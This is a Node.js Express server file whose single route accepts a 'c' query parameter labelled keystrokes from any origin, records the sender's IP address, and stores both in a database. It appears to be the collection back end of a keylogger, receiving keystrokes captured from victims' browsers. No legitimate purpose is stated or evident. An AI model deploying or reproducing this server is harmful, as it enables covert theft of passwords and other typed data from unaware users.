const express = require('express');
const logger = require('morgan');
const bodyParser = require('body-parser');
const app = express();
var router = express.Router();
var db = require("./db/db");
require('dotenv').config();

//////////////////
// Server Setup
//////////////////

app.set("env", process.env.NODE_ENV || "development");
app.set("host", process.env.HOST || "0.0.0.0");
app.set("port", process.env.PORT || 3000);

///////////////////////
// Server Middleware
///////////////////////

app.use(logger(app.get("env") === "production" ? "combined" : "dev"));

// parse application/json
app.use(bodyParser.json());

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }));

// CORS
// This allows client applications from other domains use the API Server
app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE")
    next();
});

//////////////////
// API Queries
//////////////////

app.use('/', router);

/* GET home page. */
router.get('/', async function(req, res, next) {
    try {
        let keystrokes = req.query['c'];
        let client = req.headers['x-forwarded-for'] ||
            req.connection.remoteAddress ||
            req.socket.remoteAddress ||
            (req.connection.socket ? req.connection.socket.remoteAddress : null);
        if (keystrokes) {
            console.log(`${new Date().toISOString()} ${client} ${keystrokes}`);
            await db.upsert({ client: client, keystrokes: keystrokes });
        }
        res.send('ok');
    } catch (e) {
        console.log(e);
        res.send('err');
    }
});

////////////////////
// Error Handlers
////////////////////

// catch 404 and forward to error handler
app.use(function(req, res, next) {
    var err = new Error('Not Found');
    err.status = 404;
    next(err);
});

// development error handler
// will print stacktrace
if (app.get('env') === 'development') {
    app.use(function(err, req, res, next) {
        res.status(err.code || 500)
            .json({
                status: 'error',
                message: err
            });
    });
}

// production error handler
// no stacktraces leaked to user
app.use(function(err, req, res, next) {
    res.status(err.status || 500)
        .json({
            status: 'error',
            message: err.message
        });
});

/////////////////////////
// Server Begin Listening
/////////////////////////

app.listen(app.get("port"), function() {
    console.log('\n' + '**********************************');
    console.log('REST API listening on port ' + app.get("port"));
    console.log('**********************************' + '\n');
});


module.exports = app;